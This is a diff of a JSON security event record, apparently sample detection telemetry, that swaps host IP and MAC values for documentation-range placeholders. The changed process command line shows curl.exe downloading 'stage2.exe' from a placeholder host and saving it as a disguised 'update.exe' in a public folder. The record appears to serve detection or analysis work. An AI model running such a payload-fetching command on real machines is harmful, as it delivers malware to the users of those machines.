@@ -31,8 +31,8 @@
       "host": {
         "id": "2868257359929504570",
         "name": "DESKTOP-FIN-0457",
-        "ip": "203.0.113.38",
-        "mac": "00:50:56:9a:2c:11"
+        "ip": "192.0.2.111",
+        "mac": "00:00:5E:00:53:6E"
       }
     },
     "carriers": [
@@ -44,7 +44,7 @@
           "uid": "63fe679e70ab3c96e517da0be9f271d3",
           "pid": "5041",
           "path": "C:\\Windows\\System32\\curl.exe",
-          "cmdline": "C:\\Windows\\System32\\curl.exe http://203.0.113.106/stage2.exe -o C:\\Users\\Public\\update.exe",
+          "cmdline": "C:\\Windows\\System32\\curl.exe http://203.0.113.15/stage2.exe -o C:\\Users\\Public\\update.exe",
           "user": {
             "name": "DESKTOP-FIN-0457\\finance"
           },
